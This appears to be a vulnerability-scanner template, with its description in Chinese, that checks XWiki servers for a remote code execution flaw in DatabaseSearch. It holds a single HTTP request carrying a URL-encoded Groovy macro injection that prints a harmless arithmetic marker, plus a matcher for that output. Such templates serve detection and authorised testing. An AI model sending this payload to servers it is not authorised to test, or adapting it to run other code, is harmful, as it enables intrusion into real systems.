info:
  name: XWiki DatabaseSearch 远程代码执⾏漏洞
  author: Deans

  description: XWiki的数据库搜索允许通过搜索⽂本远程执行代码。这允许公共wiki的任何访问者或封闭wiki的用户远程执行代码。

  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 9d9cfe6a5d51fbbf394ffdf10f9d264f

http:
- raw:
  - |+
    @timeout: 30s
    GET /xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=text=%7D%7D%7D%7B%7Basync+async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello+from%22+%2B+%22+search+text%3A%22+%2B+%2823+%2B+19%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D+ HTTP/1.1
    Content-Type: application/json
    Host: {{Hostname}}


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - ello from search text:42
    condition: and
